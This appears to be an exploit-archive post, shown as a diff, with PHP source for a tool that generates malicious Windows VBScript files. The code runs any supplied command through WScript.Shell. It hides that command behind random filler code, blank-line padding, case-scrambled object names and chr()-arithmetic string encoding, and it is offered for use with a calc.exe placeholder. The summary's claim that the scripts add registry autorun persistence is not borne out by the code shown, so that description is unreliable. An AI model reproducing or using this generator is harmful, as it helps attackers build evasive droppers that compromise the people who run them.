@@ -1,0 +1,313 @@
+=============================================================================================================================================
+| # Title     : Microsoft Windows Script Host v5.812 (.vbs) File Generator                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : System built‑in component. No standalone download available.                                                                |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/207510/
+
+[+] Summary    : Generates a malicious Microsoft Windows Script Host (.vbs) file designed to establish persistence on Windows systems.
+                 The generated VBScript, when executed, modifies autorun registry keys to ensure the payload executes automatically at system startup.
+
+
+[+] php poc.php
+
+    php 2.php
+
+==================
+1- vbs_generator.php
+==================
+<?php
+
+class VBScriptGenerator
+{
+    private $payload;
+    private $options;
+
+    public function __construct($payload, $options = [])
+    {
+        $this->payload = $payload;
+        $this->options = array_merge([
+            'filename' => 'msf.vbs',
+            'obfuscate' => true,
+            'prepend_benign_code' => true,
+            'prepend_new_lines' => 100
+        ], $options);
+    }
+
+    /**
+     * إنشاء تعبير رياضي عشوائي يُرجع قيمة الرقم المدخل
+     */
+    private function generateNumberExpression($int)
+    {
+        $rand = rand(0, 3);
+        
+        switch ($rand) {
+            case 0: // جمع
+                $a = rand(0, $int);
+                $b = $int - $a;
+                return "($a+$b)";
+                
+            case 1: // طرح
+                $r1 = $int + rand(1, 10);
+                $r2 = $r1 - $int;
+                return "($r1-$r2)";
+                
+            case 2: // ضرب (إذا كان الرقم يقبل القسمة)
+                $divisors = [];
+                for ($d = 1; $d <= $int; $d++) {
+                    if ($int % $d == 0) {
+                        $divisors[] = $d;
+                    }
+                }
+                
+                if (count($divisors) > 1) {
+                    $d = $divisors[array_rand($divisors)];
+                    return "($d*" . ($int / $d) . ")";
+                } else {
+                    return "($int+0)";
+                }
+                
+            case 3: // قسمة
+                $r2 = rand(1, 10);
+                $r1 = $int * $r2;
+                return "($r1/$r2)";
+        }
+    }
+
+    /**
+     * تقسيم النصوص إلى أجزاء ومزجها
+     */
+    private function chunkVBScriptStrings($vbscript)
+    {
+        return preg_replace_callback('/"([^"]+)"/', function($matches) {
+            $original = $matches[1];
+            $chunks = [];
+            $i = 0;
+            
+            while ($i < strlen($original)) {
+                $chunkSize = rand(1, 5);
+                $chunks[] = '"' . substr($original, $i, $chunkSize) . '"';
+                $i += $chunkSize;
+            }
+            
+            return implode(' & ', $chunks);
+        }, $vbscript);
+    }
+
+    /**
+     * توليد نصوص VBScript غير ضارة
+     */
+    private function generateVBScriptNoise($blockCount = 0)
+    {
+        $lines = [];
+        
+        for ($i = 0; $i < $blockCount; $i++) {
+            $rand = rand(0, 3);
+            
+            switch ($rand) {
+                case 0: // متغيرات وهمية
+                    $v1 = $this->randomText(6, 16);
+                    $v2 = $this->randomText(6, 16);
+                    $a = rand(0, 100);
+                    $b = rand(0, 100);
+                    $lines[] = "Dim $v1, $v2";
+                    $lines[] = "$v1 = $a";
+                    $lines[] = "$v2 = $b";
+                    break;
+                    
+                case 1: // دالة وهمية
+                    $fname = $this->randomText(6, 16);
+                    $arg = $this->randomText(6, 16);
+                    $mult = rand(1, 5);
+                    $lines[] = "Function $fname($arg)";
+                    $lines[] = "    $fname = $arg * $mult";
+                    $lines[] = "End Function";
+                    break;
+                    
+                case 2: // إجراء وهمي
+                    $sname = $this->randomText(6, 16);
+                    $arg = $this->randomText(6, 16);
+                    $mult = rand(1, 5);
+                    $lines[] = "Sub $sname($arg)";
+                    $lines[] = "    $sname = $arg * $mult";
+                    $lines[] = "End Sub";
+                    break;
+                    
+                case 3: // حلقة تكرار وهمية
+                    $idx = $this->randomText(6, 16);
+                    $max = rand(1, 5);
+                    $lines[] = "Dim $idx";
+                    $lines[] = "For $idx = 1 To $max";
+                    $lines[] = "    $idx = $idx + 0";
+                    $lines[] = "Next";
+                    break;
+            }
+        }
+        
+        return implode("\r\n", $lines);
+    }
+
+    /**
+     * تشويش نصوص VBScript
+     */
+    private function obfuscateVBScript($vbscript)
+    {
+        $obfuscated = $vbscript;
+        
+        // تشويش النصوص
+        $obfuscated = $this->chunkVBScriptStrings($obfuscated);
+        
+        $obfuscated = preg_replace_callback('/"((?:[^"]|"")*)"/', function($matches) {
+            $raw = str_replace('""', '"', $matches[1]);
+            $chars = str_split($raw);
+            $result = [];
+            
+            foreach ($chars as $c) {
+                $result[] = "chr(" . $this->generateNumberExpression(ord($c)) . ")";
+            }
+            
+            return implode(' & ', $result);
+        }, $obfuscated);
+        
+        // تشويش الأرقام
+        $obfuscated = preg_replace_callback('/\b\d+\b/', function($matches) {
+            return $this->generateNumberExpression(intval($matches[0]));
+        }, $obfuscated);
+        
+        return $obfuscated;
+    }
+
+    /**
+     * توليد نص عشوائي
+     */
+    private function randomText($min, $max)
+    {
+        $length = rand($min, $max);
+        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        $result = '';
+        
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $chars[rand(0, strlen($chars) - 1)];
+        }
+        
+        return $result;
+    }
+
+    /**
+     * توليد كود VBScript كامل
+     */
+    public function generateVBScript()
+    {
+        $vbs = '';
+        
+        // إضافة نصوص غير ضارة في البداية
+        if ($this->options['prepend_benign_code']) {
+            $vbs .= $this->generateVBScriptNoise(rand(8, 10));
+        }
+        
+        // إضافة أسطر فارغة
+        $vbs .= str_repeat("\r\n", $this->options['prepend_new_lines']);
+        
+        // معالجة الـ payload
+        $escapedPayload = str_replace(['\\', '"'], ['\\\\\\', '\\"'], $this->payload);
+        
+        // التحقق إذا كان الـ payload يحتوي على أوامر متعددة
+        if (strpos($escapedPayload, ' & ') !== false) {
+            $cmd = "cmd.exe /c $escapedPayload";
+        } else {
+            $cmd = $escapedPayload;
+        }
+        
+        // تغيير حالة أحرف WScript.Shell بشكل عشوائي
+        $shellObj = '';
+        $original = 'WScript.Shell';
+        for ($i = 0; $i < strlen($original); $i++) {
+            $shellObj .= (rand(0, 1) == 0) ? strtolower($original[$i]) : strtoupper($original[$i]);
+        }
+        
+        $vbsPayload = "CreateObject(\"$shellObj\").Run(\"$cmd\")";
+        
+        // تشويش الكود إذا مطلوب
+        if ($this->options['obfuscate']) {
+            $vbs .= $this->obfuscateVBScript($vbsPayload);
+        } else {
+            $vbs .= $vbsPayload;
+        }
+        
+        return $vbs;
+    }
+
+    /**
+     * حفظ الملف الناتج
+     */
+    public function saveFile()
+    {
+        $vbs = $this->generateVBScript();
+        $filename = $this->options['filename'];
+        
+        if (file_put_contents($filename, $vbs)) {
+            echo "File created successfully: $filename\n";
+            echo "File size: " . filesize($filename) . " bytes\n";
+            return true;
+        } else {
+            echo "Error creating file: $filename\n";
+            return false;
+        }
+    }
+}
+
+// مثال للاستخدام
+if (php_sapi_name() === 'cli') {
+    // في حالة الاستخدام من سطر الأوامر
+    $options = [
+        'filename' => 'output.vbs',
+        'obfuscate' => true,
+        'prepend_benign_code' => true,
+        'prepend_new_lines' => 100
+    ];
+    
+    // payload مثال - يمكن استبداله بأي كود
+    $payload = 'calc.exe';
+    
+    $generator = new VBScriptGenerator($payload, $options);
+    $generator->saveFile();
+}
+
+// استخدام كمكتبة
+// $generator = new VBScriptGenerator('cmd.exe /c echo test', $options);
+// $vbsCode = $generator->generateVBScript();
+
+====================
+2.php
+====================
+<?php
+require_once 'vbs_generator.php';
+
+// إنشاء كائن المولد
+$options = [
+    'filename' => 'malicious.vbs',
+    'obfuscate' => true,
+    'prepend_benign_code' => true,
+    'prepend_new_lines' => 50
+];
+
+$payload = 'calc.exe'; // الأمر الذي سيتم تنفيذه
+
+$generator = new VBScriptGenerator($payload, $options);
+
+// توليد الكود
+$vbsCode = $generator->generateVBScript();
+
+// عرض الكورد (للأغراض التعليمية فقط)
+echo "Generated VBScript Code:\n";
+echo "========================\n";
+echo $vbsCode . "\n";
+
+// حفظ الملف
+$generator->saveFile();
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
